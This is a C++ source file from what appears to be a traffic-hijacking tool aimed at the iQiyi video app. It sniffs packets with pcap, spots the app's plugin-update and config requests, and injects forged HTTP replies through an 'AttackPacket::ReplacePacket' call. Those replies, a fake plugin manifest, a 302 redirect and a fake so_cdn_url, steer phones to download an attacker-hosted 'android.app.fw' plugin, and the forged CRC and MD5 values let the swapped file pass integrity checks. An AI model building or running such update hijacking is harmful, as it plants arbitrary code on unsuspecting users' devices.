

#include "QiyiVideo.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"
#include "../version.h"
#include "../HttpUtils.h"


int QiyiVideo::prepareRespSoData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"msg\":\"success\",\"code\":\"A00000\",\"data\":"
		"{\"so_cdn_url\":\"http://%s/%s\",\"allow_record_similar\":true}}";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		szip.c_str(), filename.c_str());

	m_iRespSoSize = sprintf_s(m_lpRespSo, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSoSize;
}



int QiyiVideo::sendRespSoData(pcap_t * pcapT, const char * lppacket, int packetsize, char * ip, int type, LPPPPOEHEADER pppoe) {
	int ret = 0;
	if (m_iRespSoSize && m_lpRespSo)
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpRespSo, m_iRespSoSize, ip, type, pppoe);
	}
	return ret;
}



//android.app.fw.zip
int QiyiVideo::prepareRespData3(unsigned long ulIP, string filepath, string filename)
{
	string version = ANDROID_QIYIVIDEO_PLUGIN_VERSION;

	char * lpRespFormat =
		"HTTP/1.1 302 Moved Temporarily\r\n"
		"Content-Type: text/html\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n"
		"Location: http://%s/%s\r\n"
		"Cache-Control: no-cache\r\n"
		"Access-Control-Allow-Origin: *\r\n\r\n%s";

	char * lpRespContentFormat =
		"<html>\r\n"
		"<head><title>302 Found</title></head>\r\n"
		"<body bgcolor=\"white\">\r\n"
		"<center><h1>302 Found</h1></center>\r\n"
		"<hr><center>QWS/1.12.1</center>\r\n"
		"</body>\r\n"
		"</html>\r\n";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat,strlen(lpRespContentFormat),
		szip.c_str(), IQIYI_PLUGIN_FILENAME,  lpRespContentFormat);

	return m_iRespSize;
}






//android.app.fw.zip
int QiyiVideo::prepareRespData2(unsigned long ulIP, string filepath, string filename)
{
	string version = ANDROID_QIYIVIDEO_PLUGIN_VERSION;

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n\r\n%s";

	char * format = "{\"fid\":\"http%%3A%%2F%%2F%s%%2F%s\",\"os\":\"\",\"p1\":\"2_22_222\",\"dtime\":\"\",\"ua_model\":\"\",\"fsize\":\"%u\",\"stat\":\"2\",\"biz\":\"1020\",\"net_work\":\"1\",\"errcode\":\"\",\"v\":\"%s\",\"u\":\"\",\"pu\":\"\",\"fname\":\"%s.dl\",\"dltype\":\"30\"},"
		"{\"fid\":\"http%%3A%%2F%%2F%s%%2F%s\",\"os\":\"\",\"p1\":\"2_22_222\",\"dtime\":\"\",\"ua_model\":\"\",\"fsize\":\"%u\",\"stat\":\"1\",\"biz\":\"1020\",\"net_work\":\"1\",\"errcode\":\"\",\"v\":\"%s\",\"u\":\"\",\"pu\":\"\",\"fname\":\"%s.dl\",\"dltype\":\"30\"}";

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	m_filesize = FileOper::getFileSize(filepath + filename);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, format,
		szip.c_str(), IQIYI_PLUGIN_FILENAME, m_filesize, version.c_str(), IQIYI_PLUGIN_FILENAME,
		szip.c_str(), IQIYI_PLUGIN_FILENAME, m_filesize, version.c_str(), IQIYI_PLUGIN_FILENAME);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}


char * gIqiyiUrl = "GET /fusion/3.0/plugin?";
int gIqiyiUrlLen = lstrlenA(gIqiyiUrl);
int gIqiyiFlag = 0;
unsigned int gsip = 0;
unsigned int gdip = 0;
unsigned int gsport = 0;
unsigned int gdport = 0;

int QiyiVideo::isIqiyiSplitted(const char * data, int len) {
	if (memcmp(gIqiyiUrl,data,gIqiyiUrlLen) == 0)
	{
		gIqiyiFlag = TRUE;
	}
	
	if (gIqiyiFlag && memcmp(data + len - 4, "\r\n\r\n", 4) == 0)
	{
		if (strstr(data,"\r\nqyid: ") )
		{
			gIqiyiFlag = FALSE;
			return TRUE;
		}else if (strstr(data, "\r\nHost: iface2.iqiyi.com\r\n"))
		{
			gIqiyiFlag = FALSE;
			return TRUE;
		}
	}

	return FALSE;
}


int QiyiVideo::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n\r\n%s";
		//"Connection: keep-alive\r\n"
		//"Keep-Alive: timeout=0, max=0\r\n\r\n%s";	//keep-alive

	char * lpRespContentFormat =
		"{\"code\":0,\"data\":"
		"{\"plugins\":"
		"{\"plugin\":"
		"["
		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"tv.pps.bi.biplugin\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"5.0.2\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"4.9.7\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6312\",\"plugin_name\":\"BI统计\",\"type\":0,\"desc\":\"BI插件\"},"
		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"android.app.fw\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"9.7.5\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"9.6.0\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6325\",\"plugin_name\":\"插件公共模块\",\"type\":0,\"desc\":\"插件公共模块\"},"
		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"com.qiyi.traffic\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"2.3.1\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"\",\"s_pingback\":0,\"c_dl_mn\":2,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6324\",\"plugin_name\":\"定向流量\",\"type\":0,\"desc\":\"定向流量\"},"
		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"com.iqiyi.plugin.qiyibase\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6326\",\"plugin_name\":\"基础公共插件\",\"type\":0,\"desc\":\"基础公共插件\"},"
		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"com.iqiyi.share\",\"local\":0,\"invisible\":0,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"3.1\",\"plugin_gray_ver\":"",\"is_base\":0,\"l_ver\":\"3.1\",\"s_pingback\":1,\"c_dl_mn\":2,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_icon_url\":\"\",\"plugin_id\":\"6310\",\"plugin_name\":\"登录分享\",\"type\":0,\"desc\":\"人们分享，因此变得亲密\"}"

		//"{\"kernel\":\"android.app.fw\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"%s/%s\",\"remove\":1,\"size\":%u,\"pak_name\":\"com.qiyi.gamecenter\",\"local\":0,\"invisible\":0,\"icon_url\":\"\",\"start_icon\":1,\"upgrade_type\":0,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":2,\"plugin_icon_url\":\"\",\"plugin_id\":\"6308\",\"plugin_name\":\"游戏中心\",\"type\":0,\"desc\":\"爱奇艺游戏中心提供酷炫的游戏下载、丰富的礼包福利。还有诸多游戏达人的攻略分享与线上活动。专为游戏发烧友而生\"},"
		//"{\"kernel\":\"android.app.fw\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":1,\"size\":%u,\"pak_name\":\"com.qiyi.video.reader\",\"local\":0,\"invisible\":0,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"%s\",\"s_pingback\":2,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":2,\"plugin_icon_url\":\"\",\"plugin_id\":\"6306\",\"plugin_name\":\"爱奇艺文学\",\"type\":0,\"desc\":\"海量图书资源，智能喜好推荐，极致阅读体验，尽在爱奇艺文学！\"},"	
		//"{\"kernel\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":1,\"size\":%u,\"pak_name\":\"com.qiyi.live.base\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":1,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6332\",\"plugin_name\":\"直播基础插件\",\"type\":0,\"desc\":\"直播需要的so库，主要是livenet6.so\"},"
		"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\", \"remove\":0,\"size\":%u,"
		"\"pak_name\":\"android.app.fw\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,"
		"\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,"
		"\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6325\",\"plugin_name\":\"插件公共模块\",\"type\":0,\"desc\":\"插件公共模块\"}"

// 		",{\"baseplugins\":\"android.app.fw\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":1,\"size\":%u,"
// 		"\"pak_name\":\"tv.pps.appstore\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,"
// 		"\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,"
// 		"\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":2,\"plugin_icon_url\":\"\",\"plugin_id\":\"6307\","
// 		"\"plugin_name\":\"应用商店\",\"type\":0,\"desc\":\"\"}"

		"]"
		"}"
		"}"
		"}"
		"\r\n\r\n\r\n\r\n";


	string plugin1ver = ANDROID_QIYIVIDEO_PLUGIN_VERSION;
	string plugin2ver = ANDROID_QIYIVIDEO_PLUGIN_VERSION;
	string plugin3ver = ANDROID_QIYIVIDEO_PLUGIN_VERSION;

	string newfn = filepath + filename + "_new";
	ret = FileOper::fileDecryptWriter(filepath + filename, newfn);

	string crc = CryptoUtils::FileCrc32(newfn,1024,FALSE);

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		crc.c_str(),crc.c_str(),szip.c_str(), IQIYI_PLUGIN_FILENAME, m_filesize,plugin1ver.c_str(), plugin1ver.c_str(), m_szmd5
		//,crc.c_str(), crc.c_str(), szip.c_str(), QIYI_PLUGIN_FILENAME, filesize, plugin1ver.c_str(), plugin1ver.c_str(), szmd5
	);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}



/*
GET /v1/video-material/api/config/get_config.action?agent_version=9.12.0&device_id=99001145682067&m_device_id=99001145682067&names=so_cdn_url&platformId=10&sign=80fc35cf4613358c623cc26b41a50aa3&timestamp=1545807439531 HTTP/1.1
Connection: Keep-Alive
sign: 9087def65c76d33781de22ce4936c836
t: 504962666
qyid: 0_3690de2607bbbbd4_F4Z60ZE2ZC8ZBDZF6
Host: vertical-play.iqiyi.com
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 26 Dec 2018 06:57:20 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 168
Connection: keep-alive
Accept-Charset:

{"msg":"success","code":"A00000","data":
{"so_cdn_url":"http://cdndata.video.iqiyi.com/cdn/Small_video/20181204/fa/e6/Small_video_26199ce74d604fa7bf081aa7919205fc.zip"}}
*/
